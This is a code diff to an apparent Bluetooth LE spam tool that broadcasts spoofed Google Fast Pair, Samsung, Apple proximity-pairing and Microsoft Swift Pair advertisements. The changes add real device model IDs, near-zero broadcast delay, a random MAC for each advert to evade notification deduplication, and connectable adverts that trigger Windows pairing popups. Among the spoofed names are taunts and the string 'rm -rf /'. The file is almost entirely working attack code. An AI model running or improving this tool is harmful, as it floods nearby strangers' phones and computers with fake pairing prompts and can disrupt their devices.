@@ -60,45 +60,58 @@ font = scaled_font()
 # Constants
 # ---------------------------------------------------------------------------
 HCI_DEV = None  # set in main() via select_bt_interface
-MODES = ["FastPair", "iOS", "Windows", "ALL"]
-SPEED_LEVELS = [200, 150, 100, 75, 50]  # ms between broadcasts
+MODES = ["FastPair", "Samsung", "iOS", "Windows", "ALL"]
+SPEED_LEVELS = [150, 80, 30, 10, 0]  # ms between broadcasts
 SPEED_LABELS = ["Slow", "Med", "Fast", "Vfast", "Max"]
 
-# Google Fast Pair model IDs (various headphones/speakers)
+# Google Fast Pair model IDs (real registered device IDs)
 FASTPAIR_MODELS = [
-    b"\x00\x00\x01", b"\x00\x00\x02", b"\x00\x00\x03",
-    b"\x00\x00\x04", b"\x00\x00\x05", b"\x00\x00\x06",
-    b"\x00\x00\x07", b"\x00\x00\x08", b"\x00\x00\x09",
-    b"\x00\x00\x0A", b"\x00\x00\x0B", b"\x00\x00\x0C",
-    b"\x2C\xDE\xAD", b"\xAA\xBB\xCC", b"\x11\x22\x33",
-    b"\xDD\xEE\xFF", b"\x12\x34\x56", b"\x78\x9A\xBC",
+    b"\x2C\x01\x00",  # Pixel Buds A
+    b"\xDA\x2B\x00",  # Pixel Buds Pro
+    b"\x8B\x66\x00",  # Pixel Buds Pro 2
+    b"\x06\xB7\x00",  # JBL Flip 6
+    b"\x72\xEF\x00",  # JBL Charge 5
+    b"\x30\x56\x00",  # Sony WH-1000XM4
+    b"\xF5\x25\x00",  # Sony WH-1000XM5
+    b"\xE4\x2D\x00",  # Sony WF-1000XM4
+    b"\x39\x48\x00",  # Samsung Galaxy Buds2 Pro
+    b"\x51\x30\x00",  # Samsung Galaxy Buds FE
+    b"\xC9\x9D\x00",  # Samsung Galaxy Buds Live
+    b"\x0A\xAB\x00",  # Samsung Galaxy Buds2
+    b"\xED\x73\x00",  # Bose QC45
+    b"\xC9\x22\x00",  # Bose QC Earbuds
+    b"\x09\x64\x00",  # Nothing Ear (1)
+    b"\xCB\x01\x00",  # Google Home Mini
 ]
 
-# Apple device model bytes for Proximity Pairing
-# (type 0x07 = proximity pairing, various device models)
+# Samsung BLE device model IDs (company 0x0075)
+SAMSUNG_MODELS = [
+    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
+    0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15,
+    0x16, 0x17, 0x18, 0xE4, 0xE5, 0x1B, 0x1C, 0x1D, 0x1E,
+    0x20, 0xEC, 0xEF,
+]
+
+# Apple Continuity protocol device types + model IDs
+# Format: (type_byte, model_id, name)
 APPLE_DEVICES = [
-    (b"\x01\x01\x20", "AirPods"),
-    (b"\x01\x02\x20", "AirPods Pro"),
-    (b"\x01\x03\x20", "AirPods Max"),
-    (b"\x01\x04\x20", "AirPods 3"),
-    (b"\x01\x05\x20", "Beats Fit Pro"),
-    (b"\x01\x06\x20", "Beats Solo"),
-    (b"\x01\x07\x20", "Beats Studio"),
-    (b"\x01\x08\x20", "PowerBeats"),
-    (b"\x01\x09\x20", "Beats X"),
-    (b"\x01\x0A\x20", "AirPods Pro 2"),
-    (b"\x03\x01\x20", "AirTag"),
-    (b"\x05\x01\x20", "HomePod"),
-    (b"\x06\x01\x20", "AppleTV"),
-    (b"\x0A\x01\x20", "AirPods 4"),
-    (b"\x0B\x01\x20", "Beats Solo 4"),
-    (b"\x0C\x01\x20", "Beats Pill"),
-]
-
-# Microsoft Swift Pair device names
-SWIFT_PAIR_NAMES = [
-    "Speaker", "Keyboard", "Mouse", "Headset",
-    "Earbuds", "Gamepad", "Display", "Printer",
+    (0x07, 0x01, "AirPods"),
+    (0x07, 0x02, "AirPods Pro"),
+    (0x07, 0x03, "AirPods Max"),
+    (0x07, 0x04, "AirPods 3"),
+    (0x07, 0x05, "Beats Fit Pro"),
+    (0x07, 0x06, "Beats Solo 3"),
+    (0x07, 0x07, "Beats Studio 3"),
+    (0x07, 0x08, "PowerBeats 3"),
+    (0x07, 0x09, "Beats X"),
+    (0x07, 0x0A, "AirPods Pro 2"),
+    (0x07, 0x0B, "Beats Solo Buds"),
+    (0x07, 0x0C, "Beats Pill+"),
+    (0x07, 0x0E, "AirPods 4"),
+    (0x07, 0x0F, "Beats Flex"),
+    (0x07, 0x10, "AirTag"),
+    (0x07, 0x14, "HomePod"),
+    (0x07, 0x19, "AppleTV 4K"),
 ]
 
 # ---------------------------------------------------------------------------
@@ -118,11 +131,20 @@ last_device = ""
 # ---------------------------------------------------------------------------
 
 def _hci_up():
-    """Bring hci0 up."""
+    """Stop bluetoothd (it blocks raw HCI) and bring adapter up."""
+    subprocess.run(
+        ["sudo", "systemctl", "stop", "bluetooth"],
+        capture_output=True, timeout=5,
+    )
+    subprocess.run(
+        ["sudo", "hciconfig", HCI_DEV, "down"],
+        capture_output=True, timeout=5,
+    )
     subprocess.run(
         ["sudo", "hciconfig", HCI_DEV, "up"],
         capture_output=True, timeout=5,
     )
+    time.sleep(0.3)
 
 
 def _hci_set_adv_data(hex_bytes):
@@ -166,21 +188,22 @@ def _hci_disable_adv():
 
 
 def _hci_set_adv_params():
-    """Set advertising parameters for non-connectable undirected with random address."""
-    # Min interval=0x00A0 (100ms), Max=0x00A0, type=3 (non-conn),
-    # own addr=1 (RANDOM), peer addr type=0, peer=00:00:00:00:00:00,
-    # channel map=7, filter=0
+    """Set advertising parameters for connectable undirected (Swift Pair compatible).
+
+    ADV_IND (0x00) = connectable — required for Swift Pair notifications.
+    Fast interval (0x0020 = 20ms) for quick Windows detection.
+    """
     subprocess.run(
         [
             "sudo", "hcitool", "-i", HCI_DEV, "cmd",
             "0x08", "0x0006",
-            "A0", "00",   # min interval
-            "A0", "00",   # max interval
-            "03",         # adv type: non-connectable
-            "01",         # own address type: RANDOM (use LE random address)
+            "20", "00",   # min interval: 0x0020 = 20ms (fast for Swift Pair)
+            "20", "00",   # max interval: 0x0020 = 20ms
+            "00",         # adv type: ADV_IND (connectable undirected)
+            "01",         # own address type: RANDOM
             "00",         # peer address type
             "00", "00", "00", "00", "00", "00",  # peer address
-            "07",         # channel map (all)
+            "07",         # channel map (all 3 channels)
             "00",         # filter policy
         ],
         capture_output=True, timeout=5,
@@ -214,34 +237,43 @@ def _randomize_mac():
 
 
 def _broadcast_once(adv_bytes, label):
-    """Broadcast one advertisement with random LE address.
+    """Broadcast one advertisement at max speed using single bash call.
 
-    Uses LE Set Random Address before each advert so the target sees
-    a different source MAC each time, bypassing notification dedup.
-    No full reset between cycles for speed.
+    Combines: disable → random MAC → set params → set data → enable
+    into one subprocess for minimal overhead (~50ms total).
+    Keeps advertising active for 100ms then disables (enough for
+    Windows to detect and trigger Swift Pair notification).
     """
     global packets_sent, last_error, last_device
 
     try:
-        _hci_disable_adv()
-        _randomize_mac()
-        _hci_set_adv_params()
-        result = _hci_set_adv_data(adv_bytes)
-        if result.returncode != 0:
-            # Full reset on error
-            _hci_reset()
-            time.sleep(0.3)
-            _hci_up()
-            _randomize_mac()
-            _hci_set_adv_params()
-            result = _hci_set_adv_data(adv_bytes)
-            if result.returncode != 0:
-                with lock:
-                    last_error = (result.stderr or "hci err").strip()[:30]
-                return False
-        _hci_enable_adv()
-        time.sleep(1)
-        _hci_disable_adv()
+        # Random MAC
+        mac = [random.randint(0, 255) for _ in range(6)]
+        mac[0] = mac[0] | 0xC0
+        mac_hex = " ".join(f"{b:02X}" for b in mac)
+
+        # Adv data hex
+        data = list(adv_bytes)
+        data_len = len(data)
+        while len(data) < 30:
+            data.append(0)
+        hex_str = " ".join(f"{b:02X}" for b in data)
+        total_len = f"{data_len:02X}"
+
+        # Single bash call — all HCI commands chained
+        script = (
+            f"hcitool -i {HCI_DEV} cmd 0x08 0x000a 00 >/dev/null 2>&1;"
+            f"hcitool -i {HCI_DEV} cmd 0x08 0x0005 {mac_hex} >/dev/null 2>&1;"
+            f"hcitool -i {HCI_DEV} cmd 0x08 0x0006 20 00 20 00 00 01 00 "
+            f"00 00 00 00 00 00 07 00 >/dev/null 2>&1;"
+            f"hcitool -i {HCI_DEV} cmd 0x08 0x0008 {total_len} {hex_str} >/dev/null 2>&1;"
+            f"hcitool -i {HCI_DEV} cmd 0x08 0x000a 01 >/dev/null 2>&1;"
+            f"sleep 0.1;"
+            f"hcitool -i {HCI_DEV} cmd 0x08 0x000a 00 >/dev/null 2>&1"
+        )
+        subprocess.run(["sudo", "bash", "-c", script],
+                       capture_output=True, timeout=3)
+
         with lock:
             packets_sent += 1
             last_device = label
@@ -261,58 +293,118 @@ def _broadcast_once(adv_bytes, label):
 # ---------------------------------------------------------------------------
 
 def _build_fastpair_adv():
-    """Build Google Fast Pair advertisement data."""
+    """Build Google Fast Pair advertisement (Service Data format)."""
     model = random.choice(FASTPAIR_MODELS)
-    # Flags + Service Data with UUID 0xFE2C
     adv = bytearray([
         0x02, 0x01, 0x06,          # Flags: LE General + BR/EDR not supported
         0x06, 0x16,                 # Length=6, Type=Service Data
-        0x2C, 0xFE,                 # UUID 0xFE2C (little-endian)
+        0x2C, 0xFE,                 # UUID 0xFE2C (Google FastPair, LE)
     ])
     adv.extend(model)
     label = f"FP:{model.hex()}"
     return bytes(adv), label
 
 
-def _build_ios_adv():
-    """Build Apple Proximity Pairing advertisement."""
-    device_bytes, name = random.choice(APPLE_DEVICES)
-    status = random.randint(0x00, 0xFF)
-    # Flags + Manufacturer Specific Data (Apple 0x004C)
+def _build_samsung_adv():
+    """Build Samsung BLE advertisement (Momentum format)."""
+    model = random.choice(SAMSUNG_MODELS)
     adv = bytearray([
         0x02, 0x01, 0x06,          # Flags
-        0x07, 0xFF,                 # Length, Type=Manufacturer Specific
-        0x4C, 0x00,                 # Apple Company ID (little-endian)
-        0x07,                       # Type: Proximity Pairing
-        status,                     # Status byte
+        0x0E, 0xFF,                 # Length=14, Type=Manufacturer Specific
+        0x75, 0x00,                 # Samsung Company ID (0x0075 LE)
+        0x01, 0x00, 0x02, 0x00,
+        0x01, 0x01, 0xFF, 0x00,
+        0x00, 0x43,
+        model,                      # Device model
     ])
-    adv.extend(device_bytes)
+    label = f"Sam:{model:02X}"
+    return bytes(adv), label
+
+
+def _build_ios_adv():
+    """Build Apple Continuity Proximity Pairing advertisement."""
+    dev_type, model_id, name = random.choice(APPLE_DEVICES)
+    # Full Apple Continuity frame
+    adv = bytearray([
+        0x02, 0x01, 0x06,          # Flags
+        0x1A, 0xFF,                 # Length=26, Type=Manufacturer Specific
+        0x4C, 0x00,                 # Apple Company ID (0x004C LE)
+        dev_type,                   # Continuity type (0x07 = proximity)
+        0x19,                       # Length of following data
+        model_id,                   # Device model
+        0x55,                       # Status: lid open + color
+    ])
+    # Pad with random bytes (encryption nonce / auth tag)
+    adv.extend(bytes(random.randint(0, 255) for _ in range(22)))
+    adv = adv[:30]
     return bytes(adv), name
 
 
+SWIFT_PAIR_NAMES = [
+    "Speaker", "Keyboard", "Mouse", "Headset",
+    "Earbuds", "Gamepad", "Display", "Webcam",
+    "\U0001F480 pwned", "\U0001F525 ur hacked", "\U00002620 oops",
+    "\U0001F916 beep boop", "\U0001F47E game over", "\U0001F47B boo!",
+    "\U0001F4A9 lol", "\U0001F608 hehe", "\U0001F92F mind=blown",
+    "FBI Van", "NSA Mic", "CIA Cam", "Hak5",
+    "fsociety", "MrRobot", "Pwned!", "HACK",
+    "rm -rf /", "Skynet", "HAL9000", "JARVIS",
+    "AirPods", "Buds Pro", "Bose QC", "JBL Go",
+    "Xbox", "PS5 Pad", "Switch", "Stadia",
+    "Free BT", "TrustMe", "NotASpy", "Candy",
+    "Error", "Loading", "Virus", "Trojan",
+    "Kali BT", "Parrot", "Pwnage", "L33T",
+]
+
 def _build_swiftpair_adv():
-    """Build Microsoft Swift Pair advertisement with unique random bytes each call.
+    """Build Microsoft Swift Pair advertisement per official spec.
 
-    Windows deduplicates by advert content. Randomizing the trailing bytes
-    and sub-scenario makes each advertisement appear as a new device.
+    Requirements from Microsoft docs:
+    - ADV_IND (connectable) — set in _hci_set_adv_params
+    - Microsoft vendor section: company 0x0006, beacon 0x03, sub-scenario, RSSI 0x80
+    - Device name OR CoD in the SAME advertisement
+    - Fast beacon interval (20ms)
     """
-    sub_scenario = random.choice([0x00, 0x01, 0x02])
-    rssi = random.randint(0x70, 0xFF)
-    # Random display hash bytes (makes each advert unique)
-    rand_tail = bytes(random.randint(0, 255) for _ in range(16))
+    name = random.choice(SWIFT_PAIR_NAMES)
+    name_bytes = name.encode("utf-8")[:10]
+    name_len = len(name_bytes)
 
+    # LE-only payload (sub-scenario 0x00): simplest, just vendor section
     adv = bytearray([
-        0x02, 0x01, 0x06,          # Flags
-        0x03, 0x03, 0x12, 0x18,    # Service UUID: 0x1812 (HID)
-        0x15, 0xFF,                 # Length=21, Type=Manufacturer Specific
-        0x06, 0x00,                 # Microsoft Company ID
-        0x03,                       # Swift Pair beacon type
-        sub_scenario,               # Sub-scenario (varies)
-        rssi,                       # RSSI (varies)
+        0x02, 0x01, 0x06,          # Flags: LE General + BR/EDR not supported
     ])
-    adv.extend(rand_tail)
-    adv = adv[:30]
-    return bytes(adv), "SP:Windows"
+
+    # Microsoft vendor section (required for Swift Pair trigger)
+    vendor = bytearray([
+        0x06, 0x00,                 # Microsoft Company ID (0x0006 LE)
+        0x03,                       # Microsoft Beacon ID (Swift Pair)
+        0x00,                       # Sub-scenario: LE only pairing
+        0x80,                       # Reserved RSSI byte (must be 0x80)
+    ])
+    adv.append(len(vendor) + 1)     # AD length
+    adv.append(0xFF)                # AD type: Manufacturer Specific Data
+    adv.extend(vendor)
+
+    # LE Appearance (gives Windows the device icon)
+    appearances = [
+        [0xC1, 0x03],  # Keyboard (0x03C1)
+        [0xC2, 0x03],  # Mouse (0x03C2)
+        [0x41, 0x02],  # Headset (0x0241)
+        [0x42, 0x02],  # Earbuds (0x0242)
+        [0x43, 0x08],  # Gamepad (0x0843)
+        [0x81, 0x02],  # Speaker (0x0281)
+    ]
+    appearance = random.choice(appearances)
+    adv.extend([0x03, 0x19])        # AD length=3, type=Appearance
+    adv.extend(appearance)
+
+    # Shortened Local Name (so Windows shows "New [Name] found")
+    adv.append(name_len + 1)        # AD length
+    adv.append(0x08)                # AD type: Shortened Local Name
+    adv.extend(name_bytes)
+
+    adv = adv[:31]
+    return bytes(adv), f"SP:{name}"
 
 
 # ---------------------------------------------------------------------------
@@ -331,6 +423,8 @@ def _spam_loop():
         builders = []
         if current_mode in ("FastPair", "ALL"):
             builders.append(_build_fastpair_adv)
+        if current_mode in ("Samsung", "ALL"):
+            builders.append(_build_samsung_adv)
         if current_mode in ("iOS", "ALL"):
             builders.append(_build_ios_adv)
         if current_mode in ("Windows", "ALL"):
@@ -505,6 +599,9 @@ def main():
 
     finally:
         _stop_spam()
+        # Restore bluetoothd
+        subprocess.run(["sudo", "systemctl", "start", "bluetooth"],
+                       capture_output=True, timeout=5)
         try:
             LCD.LCD_Clear()
         except Exception:
